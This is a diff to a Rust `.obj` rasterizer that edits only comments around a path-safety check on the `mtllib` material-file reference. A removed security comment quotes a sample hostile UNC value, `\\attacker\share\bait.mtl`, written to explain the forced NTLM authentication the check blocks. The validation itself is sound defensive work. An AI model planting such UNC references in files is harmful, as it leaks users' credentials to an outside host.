@@ -1,5 +1,4 @@
 //! Software rasterizer: a `.obj` becomes a shaded 512×512 PNG for the Deep Analyze VLM, so generically named models still get a descriptive name.
-//! macOS counterpart: `DeepAnalyze.quickLookThumbnail` (the OS 3D QuickLook generator).
 
 use std::path::Path;
 
@@ -34,7 +33,7 @@ pub(crate) fn render_obj_to_png(obj_path: &Path, out_png: &Path) -> Result<()> {
     Ok(())
 }
 
-/// Raw 512×512 RGB for the CLIP image encoder, so the scan can CLIP-embed a model's rendered shape (mirrors the macOS QuickLook→embedImage path). Err and blocking as above.
+/// Raw 512×512 RGB for the CLIP image encoder, so the scan can CLIP-embed a model's rendered shape. Err and blocking as above.
 pub(crate) fn render_obj_to_rgb(obj_path: &Path) -> Result<(Vec<u8>, u32, u32)> {
     let (verts, tris) = parse_obj(obj_path)?;
     if tris.is_empty() || verts.len() < 3 {
@@ -132,7 +131,7 @@ fn load_mtl(
     out: &mut std::collections::HashMap<String, [f32; 3]>,
     remaining_bytes: &mut u64,
 ) {
-    // SEC: the `mtllib` value is untrusted `.obj` content, accepted ONLY as a safe single-component filename inside the `.obj`'s folder. An absolute or UNC value (`mtllib \\attacker\share\bait.mtl`) would REPLACE `dir` via join() and redirect the read to an arbitrary or UNC target: an outbound SMB forced-auth (NTLM leak) or arbitrary file read, violating the no-network-egress invariant. Mirrors `deep_analyze::parse_obj_names`.
+    // The `mtllib` value is untrusted. An absolute or UNC value would replace `dir` in join() and redirect the read to an arbitrary file or an SMB share (NTLM leak), so only a plain sibling filename is accepted.
     if !crate::util::path_safety::is_safe_filename(mtl_name) {
         tracing::warn!(
             obj = %crate::platform::redact_path_for_log(obj_path),
@@ -366,7 +365,7 @@ mod tests {
         assert!(render_obj_to_png(&p, &p.with_extension("png")).is_err());
     }
 
-    /// SEC: an unsafe `mtllib` value (UNC, absolute or `..` traversal) must be rejected before any filesystem read; a plain sibling filename is still read. Asserted on the OUT map: an unsafe reference leaves it untouched.
+    /// An unsafe `mtllib` value (UNC, absolute or `..` traversal) must be rejected before any filesystem read; a plain sibling filename is still read. An unsafe reference leaves the output map untouched.
     #[test]
     fn load_mtl_rejects_unsafe_mtllib_paths() {
         let obj = write_tmp("model.obj", "v 0 0 0\n");
